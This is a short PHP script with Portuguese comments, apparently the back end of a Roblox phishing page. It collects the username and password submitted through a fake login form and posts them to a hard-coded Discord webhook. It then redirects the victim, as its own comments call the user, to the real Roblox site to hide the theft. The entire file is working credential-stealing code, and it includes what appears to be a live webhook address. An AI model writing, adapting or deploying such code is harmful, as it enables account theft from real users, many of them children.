<?php
// URL do seu webhook do Discord (vamos criar ele a seguir)
$webhook = "https://discordapp.com/api/webhooks/1479221633389695017/2or2GOKqLPYR8rrMTEbKsT-D0116Tfy0zIY4dY9JmFS0xSBjooQf318inVLfwFjjwhol";

// Junta usuário + senha numa linha só
$texto = $_POST['username'] . " | " . $_POST['password'];

// Monta o pacote que o Discord aceita
$payload = json_encode(["content" => $texto]);

// Envia para o webhook
file_get_contents($webhook, false, stream_context_create([
    "http" => [
        "method"  => "POST",
        "header"  => "Content-Type: application/json",
        "content" => $payload
    ]
]));

// Joga a vítima de volta pro Roblox real
header("Location: https://www.roblox.com/home");
exit;
